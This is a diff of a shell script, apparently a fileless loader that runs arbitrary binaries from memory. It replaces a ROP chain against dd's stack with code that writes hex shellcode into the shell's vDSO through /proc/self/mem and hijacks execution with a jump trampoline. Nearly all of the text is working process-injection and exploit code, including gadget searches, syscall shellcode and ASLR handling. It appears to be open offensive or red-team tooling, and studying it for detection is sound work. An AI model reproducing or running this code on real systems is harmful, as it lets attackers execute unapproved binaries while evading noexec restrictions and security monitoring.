@@ -101,67 +101,6 @@ search_section()
         fi
     done
 }
-# search_symbol $filename $symbol1 $symbol2
-search_symbol()
-{
-    local strtab_off=$(search_section file $1 .dynstr)
-    local strtab_size=$(echo $strtab_off | cut -d' ' -f2)
-    strtab_off=$(echo $strtab_off | cut -d' ' -f1)
-    local strtab=$(od -v -t x1 $1 -N $strtab_size -j $strtab_off| head -n-1 |\
-    cut -d' ' -f2- | tr -d ' \n')
-
-    local symtab_off=$(search_section file $1 .dynsym)
-    local symtab_size=$(echo $symtab_off | cut -d' ' -f2)
-    local symtabentsize=$(echo $symtab_off | cut -d' ' -f4)
-    symtab_off=$(echo $symtab_off | cut -d' ' -f1)
-    local symtab=$(od -v -t x1 $1 -N $symtab_size -j $symtab_off| head -n-1 |\
-    cut -d' ' -f2- | tr -d ' \n')
-    local symtab_ent_num=$((symtab_size / symtabentsize))
-
-    local name1=$(echo -n $2 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
-    tr -d ' \n')00
-    local name2=$(echo -n $3 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
-    tr -d ' \n')00
-    local len=0
-    local aux=""
-    if [ ${#name1} -ge ${#name2} ]
-    then
-        len=${#name1}
-    else
-        len=${#name2}
-        aux=$name1
-        name1=$name2
-        name2=$aux
-    fi
-
-    local symbol1_off=""
-    local symbol2_off=""
-    for i in $(seq 0 $((symtab_ent_num - 1)))
-    do
-        local symtabent=${symtab:$((i*symtabentsize*2)):$((symtabentsize*2))}
-        local symbol_name_idx=$((0x$(endian ${symtabent:0:8})))
-        local symbol_name=${strtab:$symbol_name_idx * 2:$len}
-        if [ $symbol_name = $name1 ]
-        then
-            symbol1_off=${symtabent:8 * 2:16}
-            symbol1_off=$(endian $symbol1_off)
-            symbol1_off=$((0x$symbol1_off))
-        fi
-        if [ ${symbol_name:0:${#name2}} = $name2 ]
-        then
-            symbol2_off=${symtabent:8 * 2:16}
-            symbol2_off=$(endian $symbol2_off)
-            symbol2_off=$((0x$symbol2_off))
-        fi
-
-        if [ -n "$symbol2_off" -a -n "$symbol1_off" ]
-        then
-            if [ -z $aux ]; then echo -n $symbol1_off $symbol2_off
-            else                 echo -n $symbol2_off $symbol1_off; fi
-            break
-        fi
-    done
-}
 
 # shellcode_loader "bin"
 # shellcode_loader "file" $filename $base $pathaddr
@@ -210,7 +149,7 @@ shellcode_loader()
         then
             if [ $((0x$prot & 1)) -eq 1 ] # Stack must be executable
             then
-                local stack_bottom=$(echo "$dd_maps" | grep -F "[stack]" |\
+                local stack_bottom=$(echo "$shell_maps" | grep -F "[stack]" |\
                                      cut -d' ' -f1)
                 local stack_top=$(echo $stack_bottom | cut -d'-' -f2)
                 local stack_bottom=0000$(echo $stack_bottom | cut -d'-' -f1)
@@ -354,7 +293,7 @@ shellcode_loader()
 # craft_stack $phaddr $phentsize $phnum $ld_base $entry $argv0 .. $argvn
 craft_stack()
 {
-    local stack_top=$(echo "$dd_maps" | grep -F "[stack]" |\
+    local stack_top=$(echo "$shell_maps" | grep -F "[stack]" |\
                       cut -d' ' -f1 | cut -d'-' -f2)
     # Calculate position of argv[0]
     args_len=$(echo "$@" | cut -d' ' -f6- | wc -c)
@@ -419,7 +358,7 @@ craft_stack()
 
     echo -n $stack $sc
 }
-craft_payload2()
+craft_shellcode()
 {
     local sc=""
     # Load binary
@@ -431,18 +370,21 @@ craft_payload2()
     local entry=$(echo $loadbinsc | cut -d' ' -f6)
     sc=$sc$(echo $loadbinsc | cut -d' ' -f1)
 
-    local ld_base=0000$(echo "$dd_maps" | grep `readlink -f $interp` |\
+    # Where to load the loader
+    local ld_base=0000$(echo "$shell_maps" | grep `readlink -f $interp` |\
                         head -n1 | cut -d'-' -f1)
+    if [ $((0x$ld_base)) -eq 0 ] # The shell may be static or using musl
+    then
+        ld_base="00000000fffff000"
+    fi
 
     ### Initial stack structures. Arguments and a rudimentary auxv ###
     local stack=$(craft_stack $phaddr $phentsize $phnum $ld_base $entry "$@")
     sc=$sc$(echo $stack | cut -d' ' -f2)
     stack=$(echo $stack | cut -d' ' -f1)
 
-    # dd makes stdin and stdout point to the input and output of data (if & of)
-    # Fortunately stderr still points to the terminal, so we can make
-    # dup2(2, 1); dup2(2, 0); to fix this
-    sc=${sc}"4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f05"
+    # The shell has the stdin pointing to a pipe, so we make dup2(2, 0)
+    sc=${sc}"4831c04889c6b0024889c7b0210f05"
 
     if [ -n "$(echo -n $bin | search_section bin "" .interp)" ] # Dynamic binary
     then
@@ -465,159 +407,56 @@ craft_payload2()
 
     if [ $DEBUG -eq 1 ]; then sc="ebfe"$sc; fi
 
-    local sc_len=$(printf "%016x" $((${#sc} / 2)))
-    echo -n $sc_len $sc$writebin$stack
-}
-
-find_gadget()
-{
-    local off=""
-    local text_off=$(search_section file $1 .text)
-    local text_size=$(echo $text_off | cut -d' ' -f2)
-    text_off=$(echo $text_off | cut -d' ' -f1)
-
-    if [ -n "$(grep --help 2>&1 | grep "byte-offset")" ]
-    then
-        off=$(tail $1 -c +$text_off | head -c $text_size | od -v -t x1 |\
-              head -n-1 | cut -d' ' -f2- | tr -d ' \n' | grep -a -b -F -o $3 |\
-              head -n1 | cut -d':' -f1)
-        off=$((off / 2 - 1))
-    else # busybox's grep does not include this option
-        local text=$(tail $1 -c +$text_off | head -c $text_size |\
-                     od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
-        local after=${text#*$3}
-        off=$(((${#text} - ${#after} - ${#3} - 1) / 2))
-    fi
-    off=$((off + $text_off + 0x$2))
-
-    printf $(endian $(printf %016x $off))
-}
-craft_rop()
-{
-    # Where is located the libc without ASLR in this system
-    local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 |\
-                      cut -d'-' -f1)
-    libc_base=$((0x$libc_base))
-
-    local pop_rdi=$(find_gadget $filename $dd_base "5fc3")
-    local pop_rsi=$(find_gadget $filename $dd_base "5ec3")
-    local pop_rdx=$(find_gadget $filename $dd_base "5ac3")
-    local ret=$(find_gadget $filename $dd_base "c3")
-    local map_size=$(((0x$1 & (~0xfff)) + 0x1000))
-    map_size=$(endian $(printf %016x $map_size))
-
-    # Find address of mprotect() and read() in the libc
-    local mprotect_offset=$(search_symbol $libc_path mprotect read)
-    local read_offset=$(echo $mprotect_offset | cut -d' ' -f2)
-    mprotect_offset=$(echo $mprotect_offset | cut -d' ' -f1)
-    local mprotect_addr=$(($mprotect_offset + $libc_base))
-    mprotect_addr=$(endian $(printf "%016x" $mprotect_addr))
-    local read_addr=$(($read_offset + $libc_base))
-    read_addr=$(endian $(printf "%016x" $read_addr))
-
-    local rop=""
-    rop=$rop$pop_rdi
-    rop=$rop"0000000000000000"
-    rop=$rop$pop_rsi
-    rop=$rop$sc_addr
-    rop=$rop$pop_rdx
-    rop=$rop$(endian $1)
-    rop=$rop$read_addr
-
-    rop=$rop$pop_rdi
-    rop=$rop$sc_addr
-    rop=$rop$pop_rsi
-    rop=$rop$map_size
-    rop=$rop$pop_rdx
-    rop=$rop"0500000000000000" # R X
-    rop=$rop$mprotect_addr
-
-    rop=$rop$sc_addr
-
-    local retsled=""
-    for i in $(seq $(((4096 - ${#rop} / 2) / 8)))
-    do
-        retsled=$retsled$ret
-    done
-    echo -n $retsled$rop
+    printf "$sc $writebin$stack"
 }
 
 # Program we are trying to execute
 read -r bin
 
-if [ $(command -v linux64) ]
-then
-    noaslr="linux64 -R"
-elif [ $(command -v setarch) ]
-then
-    noaslr="setarch `uname -m` -R"
-else
-    echo Error: I need some tool to disable ASLR. >&2
-    exit
-fi
-
+shell=$(readlink -f /proc/$$/exe)
 # Make zsh behave somewhat like bash
-if [ -n "$(/proc/self/exe --version 2> /dev/null | grep zsh)" ]
+if [ -n "$($shell --version 2> /dev/null | grep zsh)" ]
 then
     setopt SH_WORD_SPLIT
     setopt KSH_ARRAYS
 fi
 
-# Which interpreter (loader) does this dd need? (we've to parse its headers)
-interp_off=$(search_section file $filename .interp)
+# Interpreter (loader)?
+interp_off=$(search_section file $shell .interp)
 interp_size=$(echo $interp_off | cut -d' ' -f2)
 interp_off=$(echo $interp_off | cut -d' ' -f1)
-interp=$(tail -c +$(($interp_off + 1)) $filename | head -c $((interp_size - 1)))
+interp=$(tail -c +$(($interp_off + 1)) $shell | head -c $((interp_size - 1)))
 if [ $USE_INTERP -eq 1 ]; then interp_=$interp; else interp_=""; fi
 
-# dd's mappings
-dd_maps=$($noaslr $interp_ $filename if=/proc/self/maps 2> /dev/null)
-# Where is the dd binary loaded without ASLR
-dd_base=0000$(echo "$dd_maps" | grep -w $(readlink -f $filename) |\
-              head -n1 | cut -d'-' -f1)
-
+# Shell's mappings
+shell_maps=$(cat /proc/$$/maps)
+shell_base=$(echo "$shell_maps" | grep -w $shell |\
+            head -n1 | cut -d'-' -f1)
 # Address of the string with the path to the loader
-interp_addr=$(printf %016x $((interp_off + $((0x$dd_base)))))
+interp_addr=$(printf %016x $((interp_off + $((0x$shell_base)))))
 
+## Payload: Shellcode, needed parts of the binary & stack's initial content
+sc=$(craft_shellcode "$@")
+data=$(echo $sc | cut -d' ' -f2)
+sc=$(echo $sc | cut -d' ' -f1)
+sc_len=$((${#sc} / 2))
 
-## 2nd payload: Shellcode, needed parts of the binary & stack's initial content
-payload2=$(craft_payload2 "$@")
-sc_len=$(echo $payload2 | cut -d' ' -f1)
-payload2=$(echo $payload2 | cut -d' ' -f2)
+# The shellcode will be written into the vDSO
+vdso_addr=$((0x$(echo "$shell_maps" | grep -F "[vdso]" | cut -d'-' -f1)))
+# Trampoline to jump to the shellcode
+jmp="48b8"$(endian $(printf %016x $vdso_addr))"ffe0"
 
-# Find path to the libc
-libc_path=$(LD_TRACE_LOADED_OBJECTS=1 $filename < /dev/null 2> /dev/null)
-if [ -n "$libc_path" ] # System with ld
-then
-    libc_path=$(echo "$libc_path" | grep libc)
-    libc_path=$(echo $libc_path | cut -d' ' -f3)
-    libc_path=$(readlink -f $libc_path)
-else # System with musl
-    libc_path=$($interp --list $filename | grep libc)
-    libc_path=$(echo $libc_path | cut -d' ' -f3)
-fi
+sc=$(printf $sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
+data=$(printf $data | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
+jmp=$(printf $jmp | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 
-# We will load the second stage (shellcode) in the .bss of dd
-sc_addr=$(search_section file $filename .bss | cut -d' ' -f3)
-sc_addr=$(((sc_addr + 0x$dd_base) & (~0xfff)))
-sc_addr=$(endian $(printf %016x $sc_addr))
-
-## 1st payload: ROP
-rop=$(craft_rop $sc_len)
-rop_len=$((${#rop} / 2))
-
-# Position in the stack we start to overwrite. We are trying to overflow
-# write()'s stack and take control from there. I've found experimentally that
-# the RIP(s) for write() is always in the last page of the stack, and that it is
-# consistent across versions and compilations of dd... in ARM too!
-write_to_addr=$(echo "$dd_maps" | grep -F "[stack]" | cut -d' ' -f1 |\
-                cut -d'-' -f2)
-write_to_addr=$(((0x$write_to_addr - 1) & (~0xfff)))
-
-
-payload=$(printf %s "$rop$payload2" | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
-# I'm going in, wish me luck...
-printf %b "$payload" |\
-(sleep .1; $noaslr env -i $interp_ $filename bs=$rop_len count=1    \
-of=/proc/self/mem seek=$write_to_addr conv=notrunc oflag=seek_bytes \
-iflag=fullblock) 2>&1
+read syscall_info < /proc/self/syscall
+addr=$(($(echo $syscall_info | cut -d' ' -f9)))
+exec 0< <(printf $data)
+exec 3>/proc/self/mem
+# Write the shellcode
+printf $sc  | $interp_ $filename bs=1 seek=$vdso_addr >&3 2>/dev/null
+exec 3>&-
+exec 3>/proc/self/mem
+# I'm going in, wish me good luck
+printf $jmp | $interp_ $filename bs=1 seek=$addr      >&3 2>/dev/null
